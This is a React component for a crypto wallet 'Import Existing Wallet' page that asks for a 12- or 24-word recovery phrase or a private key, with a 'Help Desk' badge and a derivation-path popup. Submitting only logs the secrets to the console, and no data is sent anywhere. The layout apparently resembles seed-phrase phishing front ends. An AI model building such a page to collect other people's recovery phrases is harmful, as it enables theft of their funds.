import { useState, type FormEvent } from "react";
import { Link } from "react-router";

export default function Phrase() {
    const [activeType, setActiveType] = useState("phrase-12");
    const [words, setWords] = useState(Array(24).fill(""));
    const [key, setKey] = useState("");
    const [hdPathVisible, setHdPathVisible] = useState(false);

    const handleWordChange = (index: number, value: string) => {
        const newWords = [...words];
        newWords[index] = value;
        setWords(newWords);
    };

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        if (activeType === "phrase-key") {
            console.log("Importing key:", key);
        } else {
            console.log("Importing words:", words.filter(Boolean));
        }
    };

    const wordCount = activeType === "phrase-12" ? 12 : 24;

    return (
        <div className="login">
            <div className="outer-container">
                <div className="help-desc">
                    <span>Help Desk</span>
                    <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                        <circle cx="18" cy="18" r="18" fill="#2E2D32" />
                    </svg>
                </div>
            </div>

            <div className="container">
                <Link to="/login" className="back-btn">
                    <svg width="14" height="12" viewBox="0 0 14 12" fill="none">
                        <path
                            d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375"
                            stroke="#ABABB5"
                            strokeWidth="1.875"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                        />
                    </svg>
                </Link>

                <div className="step">Step 1/3</div>
                <h1 className="login__title">Import Existing Wallet</h1>
                <div className="login__desc">
                    <span>•</span>Enter your recovery phrase here to restore your wallet. Or click on any blank and paste the entire
                    phrase.
                    <br />
                    <span>•</span>Enter the phrase in the right order without capitalization, punctuation symbols, or spaces.
                </div>

                <div className="inner-container" id="inner-container">
                    <div className="switch">
                        <button
                            type="button"
                            data-type="phrase-12"
                            className={`switch__item ${activeType === "phrase-12" ? "switch__item--active" : ""}`}
                            onClick={() => setActiveType("phrase-12")}
                        >
                            12 word
                        </button>
                        <button
                            type="button"
                            data-type="phrase-24"
                            className={`switch__item ${activeType === "phrase-24" ? "switch__item--active" : ""}`}
                            onClick={() => setActiveType("phrase-24")}
                        >
                            24 word
                        </button>
                        <button
                            type="button"
                            data-type="phrase-key"
                            className={`switch__item ${activeType === "phrase-key" ? "switch__item--active" : ""}`}
                            onClick={() => setActiveType("phrase-key")}
                        >
                            Private key
                        </button>
                    </div>

                    {activeType !== "phrase-key" ? (
                        <form className="login__form" id="phrase" onSubmit={handleSubmit}>
                            <div className="login__fields">
                                {Array.from({ length: wordCount }).map((_, i) => (
                                    <div key={i} className="login__field-item">
                                        <div className="login__field-number">{i + 1}.</div>
                                        <input
                                            type="password"
                                            name={`word${i + 1}`}
                                            className="login__input js-login-field"
                                            value={words[i]}
                                            onChange={(e) => handleWordChange(i, e.target.value)}
                                        />
                                    </div>
                                ))}
                            </div>

                            <button
                                type="button"
                                className="btn login__path-btn"
                                id="path-btn"
                                onClick={() => setHdPathVisible(!hdPathVisible)}
                            >
                                Set Derivation Path (Advanced)
                            </button>

                            <button
                                type="submit"
                                className="login__submit-btn btn btn--one"
                                disabled={!words.slice(0, wordCount).every(Boolean)}
                            >
                                Import
                            </button>
                        </form>
                    ) : (
                        <form className="login__form" id="key-form" onSubmit={handleSubmit}>
                            <input
                                type="text"
                                id="key"
                                className="input"
                                value={key}
                                onChange={(e) => setKey(e.target.value)}
                            />
                            <button
                                type="submit"
                                className="login__submit-btn btn btn--one"
                                disabled={!key}
                            >
                                Import
                            </button>
                        </form>
                    )}
                </div>
            </div>

            {/* HD Path Popup */}
            {hdPathVisible && (
                <div className="popup">
                    <button className="popup__close-btn btn" type="button" onClick={() => setHdPathVisible(false)}>
                        ✕
                    </button>
                    <div className="popup__title">Set Custom Derivation Path</div>
                    <div className="popup__desc">
                        <span>•</span>You can create multiple addresses from one recovery phrase
                        <br />
                        <span>•</span>A lost path cannot be recovered
                        <br />
                        <span>•</span>If you're unfamiliar with this feature, skip or undo this step - Reset Settings
                    </div>
                    <div className="popup__bottom-fields">
                        <span>m/-'/-'/</span>
                        <input name="popup-input" className="input js-popup-input js-field" value="0" type="text" />
                        <span className="popup__separator">'/</span>
                        <input name="popup-input" className="input js-popup-input js-field" value="0" type="text" />
                        <span className="popup__separator">'/</span>
                        <input name="popup-input" className="input js-popup-input js-field" value="0" type="text" />
                    </div>
                </div>
            )}
        </div>
    );
}